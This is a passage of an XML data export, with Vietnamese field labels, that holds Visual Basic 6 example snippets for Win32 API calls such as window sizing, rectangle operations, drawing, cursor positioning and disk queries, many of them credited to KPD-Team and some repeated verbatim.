</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093020083055</MaVD>
    <NoiDung>Const WS_BORDER = &amp;H800000
Const WS_DLGFRAME = &amp;H400000
Const WS_THICKFRAME = &amp;H40000
Const WS_CAPTION = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Const WS_EX_CLIENTEDGE = &amp;H200
Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function AdjustWindowRectEx Lib "user32" (lpRect As RECT, ByVal dsStyle As Long, ByVal bMenu As Long, ByVal dwEsStyle As Long) As Long
Private Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim R As RECT, hDWP As Long
    R.Left = 30
    R.Top = 30
    R.Bottom = 200
    R.Right = 120
    AdjustWindowRectEx R, WS_THICKFRAME Or WS_CAPTION, False, WS_EX_CLIENTEDGE
    MoveWindow Me.hwnd, R.Left, R.Top, R.Right - R.Left, R.Bottom - R.Top, False
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095620085655</MaVD>
    <NoiDung>Private Sub Command1_Click()
Dim xx As Long
xx = ArrangeIconicWindows(Me.hwnd)
MsgBox xx
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095920085904</MaVD>
    <NoiDung>Const WS_BORDER = &amp;H800000
Const WS_DLGFRAME = &amp;H400000
Const WS_THICKFRAME = &amp;H40000
Const WS_CAPTION = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Const HWND_BOTTOM = 1
Const HWND_TOP = 0
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const SWP_SHOWWINDOW = &amp;H40
Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function AdjustWindowRect Lib "user32" (lpRect As RECT, ByVal dwStyle As Long, ByVal bMenu As Long) As Long
Private Declare Function BeginDeferWindowPos Lib "user32" (ByVal nNumWindows As Long) As Long
Private Declare Function DeferWindowPos Lib "user32" (ByVal hWinPosInfo As Long, ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function EndDeferWindowPos Lib "user32" (ByVal hWinPosInfo As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim R As RECT, hDWP As Long
    R.Left = 30
    R.Top = 30
    R.Bottom = 200
    R.Right = 120
    AdjustWindowRect R, WS_THICKFRAME Or WS_CAPTION, False
    hDWP = BeginDeferWindowPos(1)
    DeferWindowPos hDWP, Me.hwnd, HWND_TOP, R.Left, R.Top, R.Right - R.Left, R.Bottom - R.Top, SWP_SHOWWINDOW
    EndDeferWindowPos hDWP
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090420090415</MaVD>
    <NoiDung>Xem ví dụ ở BeginDeferWindowPos</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093721053729</MaVD>
    <NoiDung>Xem ví dụ ở BeginDeferWindowPos</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092321082300</MaVD>
    <NoiDung>Private Sub Command1_Click()
SHCreateDirectoryEx ByVal 0&amp;, "c:\AAA\BBB\CCC\", ByVal 0&amp;
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091421091425</MaVD>
    <NoiDung>'This project needs 2 Buttons
Private Type POINTAPI
    x As Long
    y As Long
End Type
Private Declare Function ClientToScreen Lib "user32" (ByVal hwnd As Long, lpPoint As POINTAPI) As Long
Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Function GetDeviceCaps Lib "gdi32" (ByVal hdc As Long, ByVal nIndex As Long) As Long

Dim P As POINTAPI
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net

    Command1.Caption = "Screen Middle"
    Command2.Caption = "Form Middle"
    'API uses pixels
    Me.ScaleMode = vbPixels
End Sub
Private Sub Command1_Click()
    'Get information about the screen's width
    P.x = GetDeviceCaps(Form1.hdc, 8) / 2
    'Get information about the screen's height
    P.y = GetDeviceCaps(Form1.hdc, 10) / 2
    'Set the mouse cursor to the middle of the screen
    ret&amp; = SetCursorPos(P.x, P.y)
End Sub
Private Sub Command2_Click()
    P.x = 0
    P.y = 0
    'Get information about the form's left and top
    ret&amp; = ClientToScreen&amp;(Form1.hwnd, P)
    P.x = P.x + Me.ScaleWidth / 2
    P.y = P.y + Me.ScaleHeight / 2
    'Set the cursor to the middle of the form
    ret&amp; = SetCursorPos&amp;(P.x, P.y)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092221092215</MaVD>
    <NoiDung>Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Sub Form_Activate()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim MyStr As String
    'Create a buffer
    MyStr = String(GetWindowTextLength(Me.hwnd) + 1, Chr$(0))
    'Get the window's text
    GetWindowText Me.hwnd, MyStr, Len(MyStr)
    MsgBox MyStr
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093721093739</MaVD>
    <NoiDung>Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Const GWW_HINSTANCE = (-6)
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim ModuleName As String, FileName As String, hInst As Long
    'create a buffer
    ModuleName = String$(128, Chr$(0))
    'get the hInstance application:
    hInst = GetWindowWord(Me.hwnd, GWW_HINSTANCE)
    'get the ModuleFileName:
    'enter the following two lines as one, single line:
    ModuleName = Left$(ModuleName, GetModuleFileName(hInst, ModuleName, Len(ModuleName)))
    'set graphics mode to persistent
    Me.AutoRedraw = True
    'show the module filename
    Me.Print "Module Filename: " + ModuleName
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093821093858</MaVD>
    <NoiDung>Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Const GWW_HINSTANCE = (-6)
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim ModuleName As String, FileName As String, hInst As Long
    'create a buffer
    ModuleName = String$(128, Chr$(0))
    'get the hInstance application:
    hInst = GetWindowWord(Me.hwnd, GWW_HINSTANCE)
    'get the ModuleFileName:
    'enter the following two lines as one, single line:
    ModuleName = Left$(ModuleName, GetModuleFileName(hInst, ModuleName, Len(ModuleName)))
    'set graphics mode to persistent
    Me.AutoRedraw = True
    'show the module filename
    Me.Print "Module Filename: " + ModuleName
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094021094029</MaVD>
    <NoiDung>Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function InflateRect Lib "user32" (lpRect As RECT, ByVal x As Long, ByVal y As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2001
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@allapi.net
    Dim R As RECT
    'initialize the rectangle
    R.Right = 100
    R.Bottom = 200
    R.Top = 20
    R.Left = 30
    'increase the width and height of the specified rectangle
    InflateRect R, 60, 50
    'show the result
    MsgBox "New rectangle's co-ordinates: (" + CStr(R.Left) + "," + CStr(R.Top) + ")-(" + CStr(R.Right) + "," + CStr(R.Bottom) + ")."
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094221094212</MaVD>
    <NoiDung>Const RDW_INVALIDATE = &amp;H1
Const BS_HATCHED = 2
Const HS_CROSS = 4
Private Type LOGBRUSH
    lbStyle As Long
    lbColor As Long
    lbHatch As Long
End Type
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function CreateBrushIndirect Lib "gdi32" (lpLogBrush As LOGBRUSH) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function IntersectRect Lib "user32" (lpDestRect As RECT, lpSrc1Rect As RECT, lpSrc2Rect As RECT) As Long
Private Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As Any, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Private Declare Function GetRgnBox Lib "gdi32" (ByVal hRgn As Long, lpRect As RECT) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function FillRect Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Check if this window is a window
    If IsWindow(Me.hwnd) = 0 Then
        MsgBox "Hmm.. I hope you altered the code, or else your system is meeting with difficulties!", vbInformation
    End If
    'API uses pixels
    Me.ScaleMode = vbPixels
End Sub
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redraw this window (invoke a Paint-event)
    RedrawWindow Me.hwnd, ByVal 0&amp;, ByVal 0&amp;, RDW_INVALIDATE
End Sub
Private Sub Form_Paint()
    Dim LB As LOGBRUSH, R As RECT, Rgn As Long, RgnRect As RECT, hBrush As Long
    'randomize
    Randomize Timer
    LB.lbColor = RGB(Int(Rnd * 256), Int(Rnd * 256), Int(Rnd * 256))
    LB.lbStyle = BS_HATCHED
    LB.lbHatch = HS_CROSS
    'Create a new brush
    hBrush = CreateBrushIndirect(LB)
    'Set the rectangle's values
    SetRect R, 0, 0, 200, 200
    'Create a rectangle region
    Rgn = CreateRectRgn(100, 50, 300, 10)
    'Get the region box
    GetRgnBox Rgn, RgnRect
    'calculate the intersection of two rectangles
    IntersectRect R, RgnRect, R
    'Empty the rectangle
    SetRectEmpty RgnRect
    'Fill our rectangle
    FillRect Me.hdc, R, hBrush
    'delete our brush
    DeleteObject hBrush
    'Check if the rectangle is empty
    If IsRectEmpty(RgnRect) &lt;&gt; 0 Then SetRectEmpty RgnRect
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094421094446</MaVD>
    <NoiDung>Const RDW_INVALIDATE = &amp;H1
Const BS_HATCHED = 2
Const HS_CROSS = 4
Private Type LOGBRUSH
    lbStyle As Long
    lbColor As Long
    lbHatch As Long
End Type
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function CreateBrushIndirect Lib "gdi32" (lpLogBrush As LOGBRUSH) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function IntersectRect Lib "user32" (lpDestRect As RECT, lpSrc1Rect As RECT, lpSrc2Rect As RECT) As Long
Private Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As Any, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Private Declare Function GetRgnBox Lib "gdi32" (ByVal hRgn As Long, lpRect As RECT) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function FillRect Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Check if this window is a window
    If IsWindow(Me.hwnd) = 0 Then
        MsgBox "Hmm.. I hope you altered the code, or else your system is meeting with difficulties!", vbInformation
    End If
    'API uses pixels
    Me.ScaleMode = vbPixels
End Sub
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redraw this window (invoke a Paint-event)
    RedrawWindow Me.hwnd, ByVal 0&amp;, ByVal 0&amp;, RDW_INVALIDATE
End Sub
Private Sub Form_Paint()
    Dim LB As LOGBRUSH, R As RECT, Rgn As Long, RgnRect As RECT, hBrush As Long
    'randomize
    Randomize Timer
    LB.lbColor = RGB(Int(Rnd * 256), Int(Rnd * 256), Int(Rnd * 256))
    LB.lbStyle = BS_HATCHED
    LB.lbHatch = HS_CROSS
    'Create a new brush
    hBrush = CreateBrushIndirect(LB)
    'Set the rectangle's values
    SetRect R, 0, 0, 200, 200
    'Create a rectangle region
    Rgn = CreateRectRgn(100, 50, 300, 10)
    'Get the region box
    GetRgnBox Rgn, RgnRect
    'calculate the intersection of two rectangles
    IntersectRect R, RgnRect, R
    'Empty the rectangle
    SetRectEmpty RgnRect
    'Fill our rectangle
    FillRect Me.hdc, R, hBrush
    'delete our brush
    DeleteObject hBrush
    'Check if the rectangle is empty
    If IsRectEmpty(RgnRect) &lt;&gt; 0 Then SetRectEmpty RgnRect
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094621094624</MaVD>
    <NoiDung>Private Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Private Sub Form_Activate()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Is window visible?
    MsgBox IsWindowVisible(Me.hwnd)
End Sub
Private Sub Form_Load()
    'Is window visible?
    MsgBox IsWindowVisible(Me.hwnd)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094721094737</MaVD>
    <NoiDung>Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Long, ByVal lpWindowName As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function LockWindowUpdate Lib "user32" (ByVal hwndLock As Long) As Long
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function Putfocus Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Const GW_HWNDNEXT = 2
Dim mWnd As Long
Function InstanceToWnd(ByVal target_pid As Long) As Long
    Dim test_hwnd As Long, test_pid As Long, test_thread_id As Long
    'Find the first window
    test_hwnd = FindWindow(ByVal 0&amp;, ByVal 0&amp;)
    Do While test_hwnd &lt;&gt; 0
        'Check if the window isn't a child
        If GetParent(test_hwnd) = 0 Then
            'Get the window's thread
            test_thread_id = GetWindowThreadProcessId(test_hwnd, test_pid)
            If test_pid = target_pid Then
                InstanceToWnd = test_hwnd
                Exit Do
            End If
        End If
        'retrieve the next window
        test_hwnd = GetWindow(test_hwnd, GW_HWNDNEXT)
    Loop
End Function
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Pid As Long
    'Lock the window update
    LockWindowUpdate GetDesktopWindow
    'Execute notepad.Exe
    Pid = Shell("c:\windows\notepad.exe", vbNormalFocus)
    If Pid = 0 Then MsgBox "Error starting the app"
    'retrieve the handle of the window
    mWnd = InstanceToWnd(Pid)
    'Set the notepad's parent
    SetParent mWnd, Me.hwnd
    'Put the focus on notepad
    Putfocus mWnd
    'Unlock windowupdate
    LockWindowUpdate False
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'Unload notepad
    DestroyWindow mWnd
    'End this program
    TerminateProcess GetCurrentProcess, 0
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094921094921</MaVD>
    <NoiDung>Const DC_ACTIVE = &amp;H1
Const DC_NOTACTIVE = &amp;H2
Const DC_ICON = &amp;H4
Const DC_TEXT = &amp;H8
Const BDR_SUNKENOUTER = &amp;H2
Const BDR_RAISEDINNER = &amp;H4
Const EDGE_ETCHED = (BDR_SUNKENOUTER Or BDR_RAISEDINNER)
Const BF_BOTTOM = &amp;H8
Const BF_LEFT = &amp;H1
Const BF_RIGHT = &amp;H4
Const BF_TOP = &amp;H2
Const BF_RECT = (BF_LEFT Or BF_TOP Or BF_RIGHT Or BF_BOTTOM)
Const DFC_BUTTON = 4
Const DFC_POPUPMENU = 5            'Only Win98/2000 !!
Const DFCS_BUTTON3STATE = &amp;H10
Const DT_CENTER = &amp;H1
Const DC_GRADIENT = &amp;H20          'Only Win98/2000 !!
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function DrawCaption Lib "user32" (ByVal hWnd As Long, ByVal hdc As Long, pcRect As RECT, ByVal un As Long) As Long
Private Declare Function DrawEdge Lib "user32" (ByVal hdc As Long, qrc As RECT, ByVal edge As Long, ByVal grfFlags As Long) As Long
Private Declare Function DrawFocusRect Lib "user32" (ByVal hdc As Long, lpRect As RECT) As Long
Private Declare Function DrawFrameControl Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal un1 As Long, ByVal un2 As Long) As Long
Private Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function OffsetRect Lib "user32" (lpRect As RECT, ByVal x As Long, ByVal y As Long) As Long
Private Sub Form_Paint()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim R As RECT
    'Clear the form
    Me.Cls
    'API uses pixels
    Me.ScaleMode = vbPixels
    'Set the rectangle's values
    SetRect R, 0, 0, Me.ScaleWidth, 20
    'Draw a caption on the form
    DrawCaption Me.hWnd, Me.hdc, R, DC_ACTIVE Or DC_ICON Or DC_TEXT Or DC_GRADIENT
    'Move the recatangle
    OffsetRect R, 0, 22
    'Draw an edge on our window
    DrawEdge Me.hdc, R, EDGE_ETCHED, BF_RECT
    OffsetRect R, 0, 22
    'Draw a focus rectangle on our window
    DrawFocusRect Me.hdc, R
    OffsetRect R, 0, 22
    'Draw a frame control on our window
    DrawFrameControl Me.hdc, R, DFC_BUTTON, DFCS_BUTTON3STATE
    OffsetRect R, 0, 22
    'draw some text on our form
    DrawText Me.hdc, "Hello World !", Len("Hello World !"), R, DT_CENTER
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095121095100</MaVD>
    <NoiDung>Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function PtInRect Lib "user32" (lpRect As RECT, ByVal x As Long, ByVal y As Long) As Long
Private Declare Function PtInRegion Lib "gdi32" (ByVal hRgn As Long, ByVal x As Long, ByVal y As Long) As Long
Private Declare Function CreateEllipticRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Private Declare Function SetPixelV Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long) As Long
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim mRGN As Long, R As RECT, x As Long, y As Long
    'Set the graphical mode to persistent
    Me.AutoRedraw = True
    'Set the rectangle's values
    SetRect R, 0, 0, 50, 50
    'Create an elliptical region
    mRGN = CreateEllipticRgnIndirect(R)
    For x = R.Left To R.Right
        For y = R.Top To R.Bottom
            'If the point is in the region, draw a green pixel
            If PtInRegion(mRGN, x, y) &lt;&gt; 0 Then
                'Draw a green pixel
                SetPixelV Me.hdc, x, y, vbGreen
            ElseIf PtInRect(R, x, y) &lt;&gt; 0 Then
                'Draw a red pixel
                SetPixelV Me.hdc, x, y, vbRed
            End If
        Next y
    Next x
    'delete our region
    DeleteObject mRGN
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095221095215</MaVD>
    <NoiDung>Const RDW_INVALIDATE = &amp;H1
Const BS_HATCHED = 2
Const HS_CROSS = 4
Private Type LOGBRUSH
    lbStyle As Long
    lbColor As Long
    lbHatch As Long
End Type
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function CreateBrushIndirect Lib "gdi32" (lpLogBrush As LOGBRUSH) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function IsRectEmpty Lib "user32" (lpRect As RECT) As Long
Private Declare Function IntersectRect Lib "user32" (lpDestRect As RECT, lpSrc1Rect As RECT, lpSrc2Rect As RECT) As Long
Private Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As Any, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Private Declare Function GetRgnBox Lib "gdi32" (ByVal hRgn As Long, lpRect As RECT) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function FillRect Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Check if this window is a window
    If IsWindow(Me.hwnd) = 0 Then
        MsgBox "Hmm.. I hope you altered the code, or else your system is meeting with difficulties!", vbInformation
    End If
    'API uses pixels
    Me.ScaleMode = vbPixels
End Sub
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redraw this window (invoke a Paint-event)
    RedrawWindow Me.hwnd, ByVal 0&amp;, ByVal 0&amp;, RDW_INVALIDATE
End Sub
Private Sub Form_Paint()
    Dim LB As LOGBRUSH, R As RECT, Rgn As Long, RgnRect As RECT, hBrush As Long
    'randomize
    Randomize Timer
    LB.lbColor = RGB(Int(Rnd * 256), Int(Rnd * 256), Int(Rnd * 256))
    LB.lbStyle = BS_HATCHED
    LB.lbHatch = HS_CROSS
    'Create a new brush
    hBrush = CreateBrushIndirect(LB)
    'Set the rectangle's values
    SetRect R, 0, 0, 200, 200
    'Create a rectangle region
    Rgn = CreateRectRgn(100, 50, 300, 10)
    'Get the region box
    GetRgnBox Rgn, RgnRect
    'calculate the intersection of two rectangles
    IntersectRect R, RgnRect, R
    'Empty the rectangle
    SetRectEmpty RgnRect
    'Fill our rectangle
    FillRect Me.hdc, R, hBrush
    'delete our brush
    DeleteObject hBrush
    'Check if the rectangle is empty
    If IsRectEmpty(RgnRect) &lt;&gt; 0 Then SetRectEmpty RgnRect
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095421095432</MaVD>
    <NoiDung>Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function UnionRect Lib "user32.dll" (lpDestRect As RECT, lpSrc1Rect As RECT, lpSrc2Rect As RECT) As Long
Private Declare Function SubtractRect Lib "user32.dll" (lprcDst As RECT, lprcSrc1 As RECT, lprcSrc2 As RECT) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Src1 As RECT, Src2 As RECT, URect As RECT, SRect As RECT
    SetRect Src1, 0, 0, 100, 150   '(0,0)-(100,150)
    SetRect Src2, 10, 50, 200, 100   '(10,50)-(200,100)
    UnionRect URect, Src1, Src2   '(0,0)-(200,150)
    SetRect SRect, 0, 0, 200, 10   '(0,0)-(200,10)
    SubtractRect URect, URect, SRect   '(0,10)-(200,150)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095521095540</MaVD>
    <NoiDung>Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function UnionRect Lib "user32.dll" (lpDestRect As RECT, lpSrc1Rect As RECT, lpSrc2Rect As RECT) As Long
Private Declare Function SubtractRect Lib "user32.dll" (lprcDst As RECT, lprcSrc1 As RECT, lprcSrc2 As RECT) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Src1 As RECT, Src2 As RECT, URect As RECT, SRect As RECT
    SetRect Src1, 0, 0, 100, 150   '(0,0)-(100,150)
    SetRect Src2, 10, 50, 200, 100   '(10,50)-(200,100)
    UnionRect URect, Src1, Src2   '(0,0)-(200,150)
    SetRect SRect, 0, 0, 200, 10   '(0,0)-(200,10)
    SubtractRect URect, URect, SRect   '(0,10)-(200,150)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095921095901</MaVD>
    <NoiDung>Private Declare Function WriteProfileString Lib "kernel32" Alias "WriteProfileStringA" (ByVal lpszSection As String, ByVal lpszKeyName As String, ByVal lpszString As String) As Long
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090121100138</MaVD>
    <NoiDung>Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTtoalNumberOfClusters As Long) As Long
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090321100322</MaVD>
    <NoiDung>Create a new project, and add this code to Form1:
Private Declare Function GetDiskFreeSpaceEx Lib "kernel32" Alias "GetDiskFreeSpaceExA" (ByVal lpRootPathName As String, lpFreeBytesAvailableToCaller As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
Private Sub Form_Load()
    Dim r As Long, BytesFreeToCalller As Currency, TotalBytes As Currency
    Dim TotalFreeBytes As Currency, TotalBytesUsed As Currency
    'the drive to find
    Const RootPathName = "C:\"
    'get the drive's disk parameters
    Call GetDiskFreeSpaceEx(RootPathName, BytesFreeToCalller, TotalBytes, TotalFreeBytes)
    'show the results, multiplying the returned
    'value by 10000 to adjust for the 4 decimal
    'places that the currency data type returns.
    Me.AutoRedraw = True
    Me.Cls
    Me.Print
    Me.Print " Total Number Of Bytes:", Format$(TotalBytes * 10000, "###,###,###,##0") &amp; " bytes"
    Me.Print " Total Free Bytes:", Format$(TotalFreeBytes * 10000, "###,###,###,##0") &amp; " bytes"
    Me.Print " Free Bytes Available:", Format$(BytesFreeToCalller * 10000, "###,###,###,##0") &amp; " bytes"
    Me.Print " Total Space Used :", Format$((TotalBytes - TotalFreeBytes) * 10000, "###,###,###,##0") &amp; " bytes"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090521100509</MaVD>
    <NoiDung>Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Set the graphic mode to persistent
    Me.AutoRedraw = True
    'Get information about the C:\
    Select Case GetDriveType("C:\")
        Case 2
            Me.Print "Removable"
        Case 3
            Me.Print "Drive Fixed"
        Case Is = 4
            Me.Print "Remote"
        Case Is = 5
            Me.Print "Cd-Rom"
        Case Is = 6
            Me.Print "Ram disk"
